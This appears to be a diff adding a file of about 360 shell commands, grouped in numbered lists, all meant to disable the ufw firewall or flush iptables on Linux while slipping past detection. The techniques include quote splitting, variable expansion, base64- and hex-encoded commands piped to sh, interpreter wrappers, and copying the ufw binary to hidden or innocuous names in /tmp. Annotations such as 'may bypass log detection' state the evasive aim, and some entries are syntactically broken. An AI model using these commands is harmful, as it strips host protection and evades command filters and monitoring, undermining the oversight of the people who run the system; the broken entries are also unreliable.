@@ -1,0 +1,360 @@
+1. `sudo /usr/sbin/ufw "dis"able`
+2. `sudo /usr/sbin/ufw d\isable`
+3. `sudo /usr/sbin/ufw dis\able`
+4. `sudo /usr/sbin/ufw disa"ble"`
+5. `sudo /usr/sbin/ufw "disa"ble`
+6. `sudo /usr/sbin/"u"fw disable`
+7. `sudo /usr/sbin/u"f"w disable`
+8. `sudo /usr/sbin/uf"w" disable`
+9. `sudo /usr/sbin/ufw dis""able`
+10. `sudo /usr/sbin/ufw "disab"le`
+11. `sudo /usr/sbin/ufw disab\le`
+12. `sudo /usr/sbin/ufw di"sab"le`
+13. `sudo /usr/sbin/ufw dis\\able`
+14. `sudo /usr/sbin/ufw dis\\\able`
+15. `sudo /usr/sbin/./ufw disable`
+16. `sudo /usr/sbin/ufw dis\ab\le`
+17. `sudo /usr/sbin/ufw "d""i""s""a""b""l""e"`
+18. `sudo /usr/sbin/ufw di\\sable`
+19. `sudo /usr/sbin/ufw disa\\ble`
+20. `sudo /usr/sbin/ufw di"s"ab"l"e`
+21. `sudo /usr/sbin/u"f"w "dis"able`
+22. `sudo /usr/sbin/u\\fw disable`
+23. `sudo /usr/sbin/ufw -- "disable"`
+24. `sudo /usr/sbin/ufw d$i$s$a$b$l$e`
+25. `sudo /usr/sbin/ufw $(echo disable)`
+26. `sudo /usr/sbin/ufw "dis".'able'`
+27. `sudo /usr/sbin/ufw di'sa'ble`
+28. `sudo /usr/sbin/ufw dis\able\`
+29. `sudo /usr/sbin/ufw "d""isab""le"`
+30. `sudo /usr/sbin/ufw dis\`echo able``
+1. `sudo /usr/sbin/ufw d""isable`
+2. `sudo /usr/sbin/ufw disab""le`
+3. `sudo /usr/sbin/ufw di""sab""le`
+4. `sudo /usr/sbin/ufw dis\ta\ble`
+5. `sudo /usr/sbin/ufw di\sa\ble`
+6. `sudo /usr/sbin/ufw dis\ab\tle`
+7. `sudo /usr/sbin/ufw d\x69sable`
+8. `sudo /usr/sbin/ufw d\x69\x73able`
+9. `sudo /usr/sbin/ufw disa\x62le`
+10. `sudo /usr/sbin/ufw di\x73\x61ble`
+11. `sudo /usr/sbin/ufw d\x69\x73\x61\x62\x6C\x65`
+12. `sudo /usr/sbin/ufw disab\le\`
+13. `sudo /usr/sbin/ufw disab"le"`
+14. `sudo /usr/sbin/ufw d"isab"le`
+15. `sudo /usr/sbin/ufw d\i\s\a\b\l\e`
+16. `sudo /usr/sbin/ufw "disa""ble"`
+17. `sudo /usr/sbin/ufw 'disable'`
+18. `sudo /usr/sbin/ufw "d""is""ab""le"`
+19. `sudo /usr/sbin/u"fw" disable`
+20. `sudo /usr/sbin/u\\f\\w disable`
+21. `sudo /usr/sbin/ufw di'sab'le`
+22. `sudo /usr/sbin/ufw 'disab'le`
+23. `sudo /usr/sbin/ufw disab"l"e`
+24. `sudo /usr/sbin/ufw di$A$B$L$E`
+25. `sudo /usr/sbin/ufw "dis"+"able"`
+26. `sudo /usr/sbin/ufw dis"+"able`
+27. `sudo /usr/sbin/ufw d"i""s""a""b""l""e"`
+28. `sudo /usr/sbin/ufw 'dis''able'`
+29. `sudo /usr/sbin/ufw disab\x6c\x65`
+30. `sudo /usr/sbin/ufw dis$(echo able)`
+1. `sudo systemctl stop ufw`
+2. `sudo systemctl mask ufw`
+3. `sudo systemctl disable ufw`
+4. `sudo systemctl stop ufw.service`
+5. `sudo systemctl disable ufw.service`
+6. `sudo iptables -F`
+7. `sudo iptables -P INPUT ACCEPT`
+8. `sudo iptables -P OUTPUT ACCEPT`
+9. `sudo iptables -P FORWARD ACCEPT`
+10. `sudo iptables -X`
+11. `sudo iptables -t nat -F`
+12. `sudo iptables -t nat -X`
+13. `sudo iptables --flush`
+14. `sudo iptables --delete-chain`
+15. `sudo iptables -Z`
+16. `sudo iptables-save > /dev/null`
+17. `sudo ip6tables -F`
+18. `sudo /usr/lib/ufw/ufw-init stop`
+19. `sudo /usr/lib/ufw/ufw-init teardown`
+20. `sudo bash /usr/lib/ufw/ufw-init stop`
+21. `sudo bash -c '/usr/lib/ufw/ufw-init stop'`
+22. `sudo sh /usr/lib/ufw/ufw-init stop`
+23. `sudo pkill ufw`
+24. `sudo killall ufw`
+25. `sudo systemctl restart networking`
+26. `sudo service ufw stop`
+27. `sudo service ufw disable`
+28. `sudo /etc/init.d/ufw stop`
+29. `sudo /etc/init.d/ufw disable`
+30. `sudo bash -c 'systemctl stop ufw'`
+1. `sudo systemctl stop ufw && sudo iptables -F`
+2. `sudo /usr/sbin/iptables -F`
+3. `sudo iptables -F && sudo ip6tables -F`
+4. `sudo bash -c 'iptables -F'`
+5. `sudo /usr/lib/ufw/ufw-init stop && sudo iptables -F`
+6. `sudo env -i systemctl stop ufw`
+7. `sudo nohup systemctl stop ufw &`
+8. `sudo timeout 1 systemctl stop ufw`
+9. `sudo /usr/bin/systemctl stop ufw`
+10. `sudo PATH=/usr/sbin:$PATH systemctl stop ufw`
+11. `sudo /sbin/iptables -F`
+12. `sudo su -c 'systemctl stop ufw'`
+13. `sudo systemctl kill ufw`
+14. `sudo systemctl isolate emergency.target`
+15. `sudo iptables -t filter -F`
+16. `sudo iptables --zero`
+17. `sudo iptables -t mangle -F`
+18. `sudo systemctl --quiet stop ufw`
+19. `sudo /bin/systemctl stop ufw`
+20. `sudo ufw --force disable`
+21. `sudo iptables-restore < /dev/null`
+22. `sudo systemctl reset-failed ufw`
+23. `sudo service ufw stop && sudo iptables -F`
+24. `sudo /usr/libexec/ufw/ufw-init stop`
+25. `sudo systemd-run --unit=stopufw systemctl stop ufw`
+26. `sudo perl -e 'system("systemctl stop ufw")'`
+27. `sudo python3 -c 'import os; os.system("systemctl stop ufw")'`
+28. `sudo bash -c 'exec /usr/lib/ufw/ufw-init stop'`
+29. `sudo systemctl stop firewalld && sudo systemctl stop ufw`
+30. `sudo systemctl stop ufw.socket`
+1. `sudo /usr/sbin/ufw dis*`
+2. `CMD=disable; sudo /usr/sbin/ufw $CMD`
+3. `A="/usr/sbin/ufw"; B="disable"; sudo $A $B`
+4. `sudo /usr/sbin/ufw dis\able`
+5. `sudo /usr/sbin/ufw "dis"able`
+6. `sudo /usr/sbin/ufw dis""able`
+7. `sudo /usr/sbin/ufw 'dis'able`
+8. `sudo /usr/sbin/ufw $DISABLE_CMD` *(assuming `DISABLE_CMD=disable`)*
+9. `sudo /usr/sbin/ufw $(echo disable)`
+10. `sudo /usr/sbin/ufw $(cat <<< disable)`
+11. `sudo /usr/sbin/ufw $(tr -d '\n' <<< di"sable")`
+12. `CMD1=dis; CMD2=able; sudo /usr/sbin/ufw $CMD1$CMD2`
+13. `sudo $(echo /usr/sbin/ufw) disable`
+14. `sudo /usr/sbin/ufw $(printf "%s" disable)`
+15. `sudo /usr/sbin/ufw $(echo ZGlzYWJsZQ== | base64 -d)`
+16. `sudo /usr/sbin/ufw $(echo 64697361626c65 | xxd -r -p)`
+17. `sudo /usr/sbin/ufw <(echo disable)` *(will error but may bypass log detection)*
+18. `DISABLE="dis""able"; sudo /usr/sbin/ufw $DISABLE`
+19. `sudo /usr/sbin/ufw --dis*`
+20. `sudo /usr/sbin/ufw --$(echo disable)`
+21. `sudo "/usr/sbin"/ufw disable`
+22. `sudo /usr/sbin"/ufw" disable`
+23. `sudo /usr/sbin/ufw d"$EMPTY"isable` *(EMPTY is empty var)*
+24. `DIS="dis"; ABLE="able"; sudo /usr/sbin/ufw $DIS$ABLE`
+25. `sudo $(which ufw) disable`
+26. `sudo /usr/sbin/ufw $(echo "$D1$D2")` *(D1=dis, D2=able)*
+27. `sudo /usr/sbin/ufw $@` *(run in script with `$@`="disable")*
+28. `UFW="/usr/sbin/ufw disable"; sudo $UFW`
+29. `sudo -E /usr/sbin/ufw $DISABLE` *(with env var `DISABLE=disable`)*
+30. `sudo /usr/sbin/ufw \d\i\s\a\b\l\e` *(escaped char variant)*
+1. `CMD=$(echo disa); CMD2=ble; sudo /usr/sbin/ufw $CMD$CMD2`
+2. `sudo /usr/sbin/ufw $(echo -n "disable")`
+3. `sudo /usr/sbin/ufw $(eval echo disable)`
+4. `sudo /usr/sbin/ufw $(cut -c1-7 <<< "disable")`
+5. `VAR=disable; sudo /usr/sbin/ufw ${VAR}`
+6. `sudo /usr/sbin/ufw $(grep . <<< disable)`
+7. `sudo /usr/sbin/ufw $(< <(echo disable))`
+8. `sudo /usr/sbin/ufw $(read a <<< disable; echo $a)`
+9. `sudo /usr/sbin/ufw "$(echo d""isable)"`
+10. `sudo /usr/sbin/ufw "$((0+1))disable"` *(math expression prefix)*
+11. `PART="di"; REST="sable"; sudo /usr/sbin/ufw $PART$REST`
+12. `sudo /usr/sbin/ufw $((0+1))disable` *(intended obfuscation)*
+13. `sudo /usr/sbin/ufw d$EMPTY$EMPTYisable` *(with EMPTY="")*
+14. `sudo /usr/sbin/ufw dis${x}able` *(x is unset or empty var)*
+15. `sudo /usr/sbin/ufw "$(echo -e "dis\able")"`
+16. `sudo /usr/sbin/ufw "dis"'able'`
+17. `sudo /usr/sbin/ufw $(awk 'BEGIN{print "disable"}')`
+18. `sudo /usr/sbin/ufw $(perl -e 'print "disable"')`
+19. `sudo /usr/sbin/ufw $(python3 -c 'print("disable")')`
+20. `sudo /usr/sbin/ufw $(echo disable | rev | rev)`
+21. `sudo /usr/sbin/ufw $(echo "di""sable")`
+22. `sudo /usr/sbin/ufw "$DIS""ABLE"` *(with `DIS=dis`, `ABLE=able`)*
+23. `sudo /usr/sbin/ufw $(eval echo di$(echo sable))`
+24. `sudo /usr/sbin/ufw $(expr substr "disable" 1 7)`
+25. `sudo /usr/sbin/ufw $(cat /dev/stdin <<< disable)`
+26. `sudo /usr/sbin/ufw $(base64 -d <<< ZGlzYWJsZQ==)`
+27. `sudo /usr/sbin/ufw $(xxd -r -p <<< 64697361626c65)`
+28. `sudo /usr/sbin/ufw $(echo -ne "disable\n" | tr -d '\n')`
+29. `sudo /usr/sbin/ufw $(env | grep DISABLE= | cut -d= -f2)` *(needs env var set)*
+30. `sudo /usr/sbin/ufw $(IFS=; echo disable)`
+1. `echo disable | xargs sudo /usr/sbin/ufw`
+2. `printf disable | xargs sudo /usr/sbin/ufw`
+3. `cat <<< "disable" | xargs sudo /usr/sbin/ufw`
+4. `echo dis able | awk '{print $1$2}' | xargs sudo /usr/sbin/ufw`
+5. `echo -n "disable" | xargs -n1 | xargs sudo /usr/sbin/ufw`
+6. `for i in disable; do sudo /usr/sbin/ufw $i; done`
+7. `sudo /usr/sbin/ufw $(echo disable)`
+8. `sudo /usr/sbin/ufw $(cat <<< disable)`
+9. `sudo /usr/sbin/ufw $(awk 'BEGIN{print "disable"}')`
+10. `sudo /usr/sbin/ufw $(printf "disable")`
+11. `sudo $(echo /usr/sbin/ufw) disable`
+12. `sudo $(cat <<< /usr/sbin/ufw) disable`
+13. `U=ufw; sudo /usr/sbin/$U disable`
+14. `CMD=disable; sudo /usr/sbin/ufw $CMD`
+15. `FUNC(){ echo disable; }; sudo /usr/sbin/ufw $(FUNC)`
+16. `sudo /usr/sbin/ufw $(tr -d '\n' <<< "disable")`
+17. `sudo /usr/sbin/ufw $(cut -c1-7 <<< "disable")`
+18. `x="dis""able"; sudo /usr/sbin/ufw $x`
+19. `sudo /usr/sbin/ufw $(echo d i s a b l e | tr -d ' ')`
+20. `sudo /usr/sbin/ufw $(echo ZGlzYWJsZQ== | base64 -d)`
+21. `echo "sudo /usr/sbin/ufw disable" | bash`
+22. `sudo bash -c '/usr/sbin/ufw disable'`
+23. `sh -c 'sudo /usr/sbin/ufw disable'`
+24. `eval "sudo /usr/sbin/ufw disable"`
+25. `sudo /usr/sbin/ufw $(eval echo disable)`
+26. `echo "/usr/sbin/ufw disable" | sudo xargs -n2`
+27. `echo "ufw disable" | while read cmd arg; do sudo /usr/sbin/$cmd $arg; done`
+28. `sudo /usr/sbin/$(echo ufw) $(echo disable)`
+29. `read CMD <<< disable; sudo /usr/sbin/ufw $CMD`
+30. `COMMAND=disable && sudo /usr/sbin/ufw $COMMAND`
+1. `x="disable"; echo $x | xargs -I{} sudo /usr/sbin/ufw {}`
+2. `CMD1=ufw; CMD2=disable; sudo /usr/sbin/$CMD1 $CMD2`
+3. `sudo /usr/sbin/ufw $(head -c7 <<< "disable")`
+4. `sudo /usr/sbin/ufw $(echo "disable" | sed 's/^/d/;s/d//')`
+5. `sudo /usr/sbin/ufw $(grep disable <<< "disable")`
+6. `sudo /usr/sbin/ufw $(awk '{print}' <<< "disable")`
+7. `sudo /usr/sbin/ufw $(echo disable | cut -d" " -f1)`
+8. `DIS="dis"; ABLE="able"; sudo /usr/sbin/ufw $DIS$ABLE`
+9. `sudo /usr/sbin/ufw $(echo d i s a b l e | awk '{print $1$2$3$4$5$6$7}')`
+10. `sudo /usr/sbin/ufw $(perl -e 'print "disable"')`
+11. `sudo /usr/sbin/ufw $(echo -n "disable" | tr -d '\n')`
+12. `echo disable > /tmp/d; sudo /usr/sbin/ufw $(cat /tmp/d)`
+13. `bash -c "sudo /usr/sbin/ufw disable"`
+14. `sudo $(which ufw) disable`
+15. `U=/usr/sbin/ufw; sudo $U disable`
+16. `echo "/usr/sbin/ufw disable" | sudo bash`
+17. `cat <<EOF | bash sudo /usr/sbin/ufw disable EOF`
+18. `for i in /usr/sbin/ufw; do sudo $i disable; done`
+19. `DISABLE=disable && sudo /usr/sbin/ufw $DISABLE`
+20. `xargs -I{} sudo /usr/sbin/ufw {} <<< "disable"`
+21. `sudo /usr/sbin/ufw $(echo "$((1+1))" | sed 's/2/disable/')`
+22. `sudo /usr/sbin/ufw $(python3 -c 'print("disable")')`
+23. `echo -e "disable" | while read cmd; do sudo /usr/sbin/ufw $cmd; done`
+24. `CMD=$(echo disable); sudo /usr/sbin/ufw $CMD`
+25. `DIS="disa"; BLE="ble"; sudo /usr/sbin/ufw "$DIS$BLE"`
+26. `sudo /usr/sbin/ufw $((12345+54321)) | grep -q "disable" || sudo /usr/sbin/ufw disable`
+27. `z=$(echo d i s a b l e | sed 's/ //g'); sudo /usr/sbin/ufw $z`
+28. `A="disable"; sudo /usr/sbin/ufw $A`
+29. `echo sudo /usr/sbin/ufw disable | sh`
+30. `eval sudo /usr/sbin/ufw$(echo \ disable)`
+1. `echo c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU= | base64 -d | sh`
+2. `echo "sudo /usr/sbin/ufw disable" | base64 | xargs | base64 -d | sh`
+3. `echo '7375646f202f7573722f7362696e2f7566772064697361626c65' | xxd -r -p | sh`
+4. `sudo python3 -c "import os; os.system('c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU='.encode('utf-8').decode('base64'))"`
+5. `python3 -c "import base64;import os;os.system(base64.b64decode('c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU=').decode())"`
+6. `echo c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU= | base64 -d | sudo sh`
+7. `printf '\x73\x75\x64\x6f\x20\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65' | sh`
+8. `sudo perl -e 'system("ufw disable")'`
+9. `sudo perl -e 'system("\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65")'`
+10. `sudo ruby -e 'exec("ufw disable")'`
+11. `sudo ruby -e 'exec("\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65")'`
+12. `echo -e "sudo /usr/sbin/ufw disable" > /tmp/.cmd && sh /tmp/.cmd`
+13. `echo -e '\x73\x75\x64\x6f\x20\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65' | sh`
+14. `sudo sh -c "$(echo c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU= | base64 -d)"`
+15. `bash -c "$(echo 'c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU=' | base64 -d)"`
+16. `python3 -c "exec('import os; os.system(\"/usr/sbin/ufw disable\")')"`
+17. `python3 -c "exec('import os\\nos.system(\\\"/usr/sbin/ufw disable\\\")')"`
+18. `bash -c "$(printf '\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65' | xargs sudo)"`
+19. `sudo $(echo "/usr/sbin/ufw disable" | base64 | base64 -d)`
+20. `sudo sh -c "$(printf '\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65')"`
+21. `sh -c "$(echo 'sudo /usr/sbin/ufw disable' | base64 | base64 -d)"`
+22. `eval "$(echo c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU= | base64 -d)"`
+23. `sudo sh -c "$(xxd -r -p <<< '7375646f202f7573722f7362696e2f7566772064697361626c65')"`
+24. `sudo python3 -c "exec('import os; os.system(\\\"/usr/sbin/ufw disable\\\")')"`
+25. `sudo bash -c "eval \$(echo c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU= | base64 -d)"`
+26. `sudo echo 'dWZ3IGRpc2FibGU=' | base64 -d | sh`
+27. `sudo echo 'ufw disable' > /tmp/x && bash /tmp/x`
+28. `bash -c "$(echo '7375646f202f7573722f7362696e2f7566772064697361626c65' | xxd -r -p)"`
+29. `python3 -c 'import os; os.system(bytes.fromhex("7375646f202f7573722f7362696e2f7566772064697361626c65").decode())'`
+30. `sudo sh -c "$(perl -MMIME::Base64 -e 'print decode_base64("c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU=")')"`
+1. `sudo sh -c "$(echo -n 'sudo /usr/sbin/ufw disable' | base64 | base64 -d)"`
+2. `sudo sh -c "$(python3 -c 'import base64; print(base64.b64decode("c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU=").decode())')"`
+3. `sudo bash -c "$(perl -e 'print pack("H*", "7375646f202f7573722f7362696e2f7566772064697361626c65")')"`
+4. `sudo $(cat <<< "/usr/sbin/ufw disable")`
+5. `sudo sh -c "$(xxd -r -p <<< 7375646f202f7573722f7362696e2f7566772064697361626c65)"`
+6. `sudo bash -c "$(echo -e '\u0075\u0066\u0077\u0020\u0064\u0069\u0073\u0061\u0062\u006c\u0065')"`
+7. `sudo sh -c "$(echo -e '\165\146\167\040\144\151\163\141\142\154\145')"`
+8. `sudo bash -c "$(echo $'ufw\\x20disable')"`
+9. `sudo bash -c "$(echo $'\\x75\\x66\\x77\\x20\\x64\\x69\\x73\\x61\\x62\\x6c\\x65' | xargs echo -e)"`
+10. `sudo $(echo -e '\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f\x75\x66\x77') disable`
+11. `sudo $(printf '/usr/sbin/%s\n' 'ufw') disable`
+12. `A='/usr/sbin/ufw'; B='disable'; sudo $A $B`
+13. `CMD=$(echo dWZ3IGRpc2FibGU= | base64 -d); sudo /usr/sbin/$CMD`
+14. `CMD=$(echo ZGlzYWJsZQ== | base64 -d); sudo /usr/sbin/ufw $CMD`
+15. `VAR1='ufw'; VAR2='disable'; sudo /usr/sbin/$VAR1 $VAR2`
+16. `sudo eval "$(echo 'dWZ3IGRpc2FibGU=' | base64 -d | sed 's/^/\/usr\/sbin\//')"`
+17. `python3 -c "import os; os.system('\u0075\u0066\u0077\u0020\u0064\u0069\u0073\u0061\u0062\u006c\u0065')"`
+18. `sudo perl -e 'print "\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65\n"' | sh`
+19. `echo "ufw disable" | tr -d '\n' | sudo /usr/sbin/bash`
+20. `sudo /usr/sbin/$(echo 'ufw' | tr -d '\n') $(echo 'disable' | tr -d '\n')`
+21. `echo "ufw disable" | base64 | base64 -d | xargs -0 sudo /usr/sbin/bash -c`
+22. `sudo bash -c "$(python3 -c 'import base64; print(base64.b64decode("dWZ3IGRpc2FibGU=").decode())')"`
+23. `sudo bash -c "$(perl -e 'print pack("C*",117,102,119,32,100,105,115,97,98,108,101)')"`
+24. `sudo bash -c "$(cat <<< $'\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65')"`
+25. `sudo sh -c "$(echo 'sudo /usr/sbin/ufw disable' | base64 | base64 -d)"`
+26. `echo -n "sudo /usr/sbin/ufw disable" > /tmp/.hidden && sudo bash /tmp/.hidden`
+27. `sudo /usr/sbin/ufw $(printf '\x64\x69\x73\x61\x62\x6c\x65')`
+28. `sudo /usr/sbin/ufw $(echo "ZGlzYWJsZQ==" | base64 -d)`
+29. `A=$(printf '\x64\x69\x73\x61\x62\x6c\x65'); sudo /usr/sbin/ufw $A`
+30. `sudo bash -c "$(cat <<EOF | base64 -d c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGUK EOF )"`
+1. `cp /usr/sbin/ufw /tmp/fw; sudo /tmp/fw disable`
+2. `cp /usr/sbin/ufw /tmp/firewall; sudo /tmp/firewall disable`
+3. `cp /usr/sbin/ufw /tmp/a.out; sudo /tmp/a.out disable`
+4. `cp /usr/sbin/ufw /tmp/ufw_bak; sudo /tmp/ufw_bak disable`
+5. `cp /usr/sbin/ufw /tmp/ufw2; sudo /tmp/ufw2 disable`
+6. `cp /usr/sbin/ufw /tmp/stopper; sudo /tmp/stopper disable`
+7. `cp /usr/sbin/ufw /tmp/cmd; sudo /tmp/cmd disable`
+8. `cp /usr/sbin/ufw /tmp/netctl; sudo /tmp/netctl disable`
+9. `cp /usr/sbin/ufw /tmp/fwctl; sudo /tmp/fwctl disable`
+10. `cp /usr/sbin/ufw /tmp/u; sudo /tmp/u disable`
+11. `ln -s /usr/sbin/ufw /tmp/f; sudo /tmp/f disable`
+12. `ln -s /usr/sbin/ufw /tmp/ufwlink; sudo /tmp/ufwlink disable`
+13. `ln -s /usr/sbin/ufw /tmp/shield; sudo /tmp/shield disable`
+14. `ln -s /usr/sbin/ufw /tmp/dctl; sudo /tmp/dctl disable`
+15. `ln -s /usr/sbin/ufw /tmp/system_firewall; sudo /tmp/system_firewall disable`
+16. `install /usr/sbin/ufw /tmp/fwcopy; sudo /tmp/fwcopy disable`
+17. `cp /usr/sbin/ufw ~/ufw_hidden; sudo ~/ufw_hidden disable`
+18. `cp /usr/sbin/ufw /dev/shm/ufw_exec; sudo /dev/shm/ufw_exec disable`
+19. `cp /usr/sbin/ufw /run/ufw_tmp; sudo /run/ufw_tmp disable`
+20. `ln -s /usr/sbin/ufw ~/bin/fw; sudo ~/bin/fw disable`
+21. `cp /usr/sbin/ufw /tmp/.ufw; sudo /tmp/.ufw disable`
+22. `cp /usr/sbin/ufw /tmp/.hidden_fw; sudo /tmp/.hidden_fw disable`
+23. `cp /usr/sbin/ufw /tmp/firewall_cmd; sudo /tmp/firewall_cmd disable`
+24. `cp /usr/sbin/ufw /var/tmp/fwdaemon; sudo /var/tmp/fwdaemon disable`
+25. `cp /usr/sbin/ufw /tmp/fwexec; chmod +x /tmp/fwexec; sudo /tmp/fwexec disable`
+26. `ln -s /usr/sbin/ufw /tmp/sbin_ufw; sudo /tmp/sbin_ufw disable`
+27. `cp /usr/sbin/ufw /tmp/fwsafe; sudo /tmp/fwsafe disable`
+28. `cp /usr/sbin/ufw /tmp/sudo_fw; sudo /tmp/sudo_fw disable`
+29. `cp /usr/sbin/ufw /tmp/f; chmod +x /tmp/f; sudo /tmp/f disable`
+30. `install -m 0755 /usr/sbin/ufw /tmp/ucontrol; sudo /tmp/ucontrol disable`
+1. `cp /usr/sbin/ufw /tmp/u_firewall; sudo /tmp/u_firewall disable`
+2. `cp /usr/sbin/ufw /tmp/control_fw; sudo /tmp/control_fw disable`
+3. `cp /usr/sbin/ufw /tmp/ctrl; sudo /tmp/ctrl disable`
+4. `cp /usr/sbin/ufw /tmp/fx; sudo /tmp/fx disable`
+5. `cp /usr/sbin/ufw /tmp/defender; sudo /tmp/defender disable`
+6. `cp /usr/sbin/ufw /tmp/fence; sudo /tmp/fence disable`
+7. `cp /usr/sbin/ufw /tmp/bouncer; sudo /tmp/bouncer disable`
+8. `cp /usr/sbin/ufw /tmp/netguard; sudo /tmp/netguard disable`
+9. `cp /usr/sbin/ufw /tmp/xufw; sudo /tmp/xufw disable`
+10. `cp /usr/sbin/ufw /opt/ufwcopy; sudo /opt/ufwcopy disable`
+11. `cp /usr/sbin/ufw /usr/local/bin/myfw; sudo /usr/local/bin/myfw disable`
+12. `cp /usr/sbin/ufw /var/tmp/.ufw_shadow; sudo /var/tmp/.ufw_shadow disable`
+13. `install -m 755 /usr/sbin/ufw /tmp/customfw; sudo /tmp/customfw disable`
+14. `cp /usr/sbin/ufw /tmp/.hidden_u; sudo /tmp/.hidden_u disable`
+15. `cp /usr/sbin/ufw /tmp/fire_stop; sudo /tmp/fire_stop disable`
+16. `ln -s /usr/sbin/ufw /tmp/ufw_symlink; sudo /tmp/ufw_symlink disable`
+17. `cp /usr/sbin/ufw /tmp/fwdaemonx; sudo /tmp/fwdaemonx disable`
+18. `cp /usr/sbin/ufw /tmp/fw_kill; sudo /tmp/fw_kill disable`
+19. `cp /usr/sbin/ufw /tmp/network_block; sudo /tmp/network_block disable`
+20. `cp /usr/sbin/ufw /tmp/protector; sudo /tmp/protector disable`
+21. `cp /usr/sbin/ufw /tmp/blockit; sudo /tmp/blockit disable`
+22. `cp /usr/sbin/ufw /tmp/fwengine; sudo /tmp/fwengine disable`
+23. `cp /usr/sbin/ufw /tmp/stopper_tool; sudo /tmp/stopper_tool disable`
+24. `cp /usr/sbin/ufw /tmp/fwshut; sudo /tmp/fwshut disable`
+25. `cp /usr/sbin/ufw /tmp/fire_rule; sudo /tmp/fire_rule disable`
+26. `cp /usr/sbin/ufw /tmp/rulebreaker; sudo /tmp/rulebreaker disable`
+27. `cp /usr/sbin/ufw /tmp/.ufw_cmd; sudo /tmp/.ufw_cmd disable`
+28. `cp /usr/sbin/ufw /tmp/fire_ctl; sudo /tmp/fire_ctl disable`
+29. `cp /usr/sbin/ufw /tmp/fwdrop; sudo /tmp/fwdrop disable`
+30. `cp /usr/sbin/ufw /tmp/system_fw; sudo /tmp/system_fw disable`
